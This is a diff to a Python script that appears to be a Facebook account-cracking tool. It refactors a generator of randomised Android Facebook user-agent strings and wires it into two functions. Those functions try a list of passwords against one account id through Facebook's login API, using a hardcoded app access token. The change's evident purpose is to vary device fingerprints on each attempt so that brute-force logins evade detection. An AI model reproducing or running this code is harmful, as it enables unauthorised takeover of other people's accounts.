@@ -346,28 +346,47 @@ def agefn():
 #----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 def facebook_agent():
-    android_version = random.choice(['10', '11', '12'])
-    model = random.choice([
-        'Samsung Galaxy S21', 
-        'Google Pixel 5', 
-        'OnePlus 9', 
-        'Xiaomi Mi 11',
-        'LG V60 ThinQ', 
-        'Sony Xperia 1 II', 
-        'Huawei P40 Pro', 
-        'Motorola Edge+', 
-        'Nokia 8.3'
-    ])  # Add more models as needed
-
+    android_versions = ['10', '11', '12']
+    
+    # List of popular Android device models
+    mobile_models = [
+        'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11',
+        'LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3'
+        # Add more models here
+    ]
+    
+    android_version = random.choice(android_versions)
+    mobile_model = random.choice(mobile_models)
+    
+    # Build number format TP1A.<random number>.<random number>
     build_number = f"TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
+    
+    # Random screen density, width, and height
     density = random.choice(['1.5', '2.0', '2.5', '3.0', '4.0'])
     width = random.choice(['480', '720', '1080', '1440'])
     height = random.choice(['800', '1280', '1920', '2560'])
-
-    agent = f'[FBAN/EMA;FBAV/{random.randint(81, 89)}.0.0.{random.randint(11, 99)};FBBV/{random.randint(31800000, 31999999)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBCR/{random.choice(["Verizon", "AT&T", "T-Mobile"])};FBMF/{model.split(" ")[0]};FBBD/{model.split(" ")[0]};FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
-
-    user_agent = f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/{build_number}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(110, 120)}.0.0.0 Mobile Safari/537.36 {agent}"
-
+    
+    # Random components in agent string
+    agent_components = {
+        'FBAV': f"{random.randint(81, 89)}.0.0.{random.randint(11, 99)}",
+        'FBBV': f"{random.randint(31800000, 31999999)}",
+        'FBDM': f"{{density={density},width={width},height={height}}}",
+        'FBLC': 'en_US',
+        'FBCR': random.choice(["Verizon", "AT&T", "T-Mobile"]),
+        'FBMF': mobile_model.split(' ')[0],
+        'FBBD': mobile_model.split(' ')[0],
+        'FBDV': mobile_model,
+        'FBSV': android_version,
+        'FBOP': '1',
+        'FBCA': 'arm64-v8a:armeabi-v7a'
+    }
+    
+    # Constructing user agent string
+    user_agent = f"Mozilla/5.0 (Linux; Android {android_version}; {mobile_model} Build/{build_number}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(110, 120)}.0.0.0 Mobile Safari/537.36 ["
+    
+    user_agent += ';'.join([f"{key}/{value}" for key, value in agent_components.items()])
+    user_agent += "]"
+    
     return user_agent
 
 def mainx2():
@@ -1410,7 +1429,7 @@ def m6(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
-            useragent = str(ua_api())
+            useragent = str(facebook_agent())
             data = {
             "email":idf,
             "password":pw,
@@ -1443,7 +1462,7 @@ def m6(idf,pwv):
             "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
             content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
             head = {
-            "User-Agent": 'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=2.625,width=1080,height=2123};FBLC/tr_TR;FBRV/525469090;FB_FW/2;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
+            "User-Agent": useragent,
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
             "X-FB-Net-HNI": str(random.randint(20000, 40000)),
@@ -1583,7 +1602,7 @@ def m8(idf,pwv):
             device_id = str(uuid.uuid4())
             adid = str(uuid.uuid4())
             accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-            useragent = str(sexua())
+            useragent = str(facebook_agent())
             data = {
             'adid':adid,
             'format':'json',
@@ -1623,7 +1642,7 @@ def m8(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=2.625,width=1080,height=2123};FBLC/tr_TR;FBRV/525469090;FB_FW/2;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
+            'User-Agent':useragent,
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
